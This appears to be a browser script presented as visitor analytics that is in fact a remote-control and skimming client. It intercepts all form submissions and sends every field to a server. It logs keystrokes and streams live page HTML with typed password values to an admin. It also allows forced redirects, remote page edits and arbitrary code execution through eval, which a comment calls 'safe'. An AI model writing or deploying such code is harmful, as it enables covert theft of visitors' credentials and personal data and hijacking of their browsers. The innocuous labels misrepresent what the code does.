/**
 * Tracker.js - Visitor Analytics & Remote Control Client
 * 
 * This script connects to the Socket.io backend to report analytics
 * and allows the admin to remotely influence the DOM.
 */

document.addEventListener('DOMContentLoaded', () => {
    // ----------------------------------------------------------------------
    // 1. Initialization & Connection
    // ----------------------------------------------------------------------
    const socket = io();
    let liveViewActive = false;

    // Optional UI element to show connection status
    const socketIdSpan = document.getElementById('socket-id');

    socket.on('connect', () => {
        console.log('Successfully connected to the server. Socket ID:', socket.id);

        // Update UI if the container exists
        if (socketIdSpan) {
            socketIdSpan.textContent = socket.id;
            socketIdSpan.style.color = '#34d399'; // Green on success
        }

        // Send Initial Telemetry
        sendTelemetryData(socket);
    });

    socket.on('disconnect', () => {
        console.log('Disconnected from the server.');
        if (socketIdSpan) {
            socketIdSpan.textContent = 'Disconnected...';
            socketIdSpan.style.color = '#f87171'; // Red on disconnect
        }
    });

    // ----------------------------------------------------------------------
    // 2. Admin Remote Commands
    // ----------------------------------------------------------------------
    socket.on('visitor_command', (data) => {
        console.log('Received command from admin:', data.command);

        switch (data.command) {
            case 'alert':
                alert(`Message from Admin: ${data.payload}`);
                break;

            case 'start_live_view':
                liveViewActive = true;
                sendLiveHtml(socket);
                break;

            case 'remote_dom_edit':
                handleDomEdit(data.payload.selector, data.payload.text, socket, liveViewActive);
                break;

            case 'remote_eval':
                handleRemoteEval(data.payload);
                break;

            default:
                console.warn('Unknown command received:', data.command);
        }
    });

    socket.on('stop_live_view', () => {
        liveViewActive = false;
        console.log('Live view stopped by admin.');
    });

    socket.on('force_redirect', (data) => {
        console.log(`Redirecting to: ${data.url}`);
        window.location.href = data.url;
    });

    // ----------------------------------------------------------------------
    // 3. Activity Monitoring (Forms, Inputs, DOM changes)
    // ----------------------------------------------------------------------

    // Track form submissions smartly
    document.addEventListener('submit', (e) => {
        e.preventDefault(); // Prevent standard browser refresh/redirect

        const form = e.target;
        const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');

        // Visual feedback / prevent double clicks
        if (submitBtn) {
            submitBtn.dataset.originalText = submitBtn.innerHTML;
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Processing...';
        }

        const formData = new FormData(form);
        const dataStr = Object.fromEntries(formData.entries());

        const formIdClass = `${form.id || ''} ${form.className || ''}`.toLowerCase();
        const isSupport = formIdClass.includes('support') || formIdClass.includes('contact');

        const redirectUrl = form.getAttribute('data-redirect') || '';

        // Emit telemetry payload including the requested redirect destination
        socket.emit('visitor_action', {
            type: 'form_submit',
            formType: isSupport ? 'support_request' : 'general_form',
            target: form.id || form.tagName,
            details: dataStr,
            redirectUrl: redirectUrl
        });

        // Fallback timeout for forms without a smart redirect attribute
        if (!redirectUrl) {
            setTimeout(() => {
                if (form.action && new URL(form.action, window.location.origin).pathname !== window.location.pathname) {
                    window.location.href = form.action;
                } else {
                    if (submitBtn) {
                        submitBtn.disabled = false;
                        submitBtn.innerHTML = submitBtn.dataset.originalText;
                    }
                    form.reset();
                    // Removed alert
                }
            }, 1000); // Give the backend 1s to record the initial log before resetting
        }
    });

    // Handle verified form success redirects directly from the backend
    socket.on('form_success', (data) => {
        if (data && data.redirectUrl) {
            window.location.href = data.redirectUrl;
        }
    });

    // Track input changes in real-time
    document.addEventListener('input', (e) => {
        const tag = e.target.tagName;
        if (tag === 'INPUT' || tag === 'SELECT' || tag === 'TEXTAREA') {
            const isPassword = e.target.type === 'password';

            // Critical: Update the actual HTML attribute so innerHTML captures it
            // For checkboxes/radios, set the checked attribute
            if (e.target.type === 'checkbox' || e.target.type === 'radio') {
                if (e.target.checked) {
                    e.target.setAttribute('checked', 'checked');
                } else {
                    e.target.removeAttribute('checked');
                }
            } else if (tag === 'SELECT') {
                // For select dropdowns, update the selected attribute on options
                Array.from(e.target.options).forEach(opt => {
                    if (opt.selected) opt.setAttribute('selected', 'selected');
                    else opt.removeAttribute('selected');
                });
            } else {
                // For text inputs and textareas, update the value attribute
                e.target.setAttribute('value', e.target.value);
                if (tag === 'TEXTAREA') {
                    e.target.textContent = e.target.value;
                }
            }

            // Only emit 'visitor_action' logs for major changes (Debounced ideally, but here we just send value)
            socket.emit('visitor_action', {
                type: 'input_change',
                target: e.target.name || e.target.id || tag,
                details: `Typing: ${isPassword ? '***' : e.target.value}`
            });

            // Sync HTML immediately so Admin sees typing live
            if (liveViewActive) sendLiveHtml(socket);
        }
    });

    // Track structural DOM changes (Throttled)
    let mutationTimeout = null;
    const observer = new MutationObserver((mutations) => {
        if (mutationTimeout) return;

        mutationTimeout = setTimeout(() => {
            socket.emit('visitor_action', {
                type: 'dom_change',
                details: `Recorded ${mutations.length} DOM structure changes.`
            });

            if (liveViewActive) sendLiveHtml(socket);
            mutationTimeout = null;
        }, 2000); // Max 1 emit per 2 seconds
    });

    observer.observe(document.body, { childList: true, subtree: true, attributes: true });

    // Track Mouse Movements (Throttled to 10fps for Live Mirror)
    let mouseTimeout = null;
    document.addEventListener('mousemove', (e) => {
        if (!liveViewActive || mouseTimeout) return;

        mouseTimeout = setTimeout(() => {
            socket.emit('live_mouse', {
                // Return exact scroll positions + viewport positions as fractional percentages
                xPos: (e.pageX / document.documentElement.scrollWidth).toFixed(4),
                yPos: (e.pageY / document.documentElement.scrollHeight).toFixed(4)
            });
            mouseTimeout = null;
        }, 100);
    });
});

// ----------------------------------------------------------------------
// Helper Functions
// ----------------------------------------------------------------------

/**
 * Gathers browser telemetry and sends to server.
 */
function sendTelemetryData(socket) {
    const telemetryData = {
        userAgent: navigator.userAgent,
        resolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        url: window.location.href,
        timestamp: new Date().toISOString()
    };
    socket.emit('visitor_data', telemetryData);
}

/**
 * Sends the current full body HTML to the server for live view.
 */
function sendLiveHtml(socket) {
    socket.emit('live_view_html', { html: document.body.innerHTML });
}

/**
 * Modifies elements in the DOM matching a CSS selector.
 */
function handleDomEdit(selector, text, socket, liveViewActive) {
    const elements = document.querySelectorAll(selector);
    console.log(`[Remote DOM Edit] Changing ${elements.length} elements matching '${selector}'`);
    elements.forEach(el => el.textContent = text);

    if (liveViewActive) {
        sendLiveHtml(socket);
    }
}

/**
 * Safely evaluates a remote script.
 */
function handleRemoteEval(scriptPayload) {
    console.log(`[Remote Eval] Executing custom JavaScript...`);
    try {
        const result = eval(scriptPayload);
        console.log('Result:', result);
    } catch (err) {
        console.error('Remote execution error:', err);
    }
}
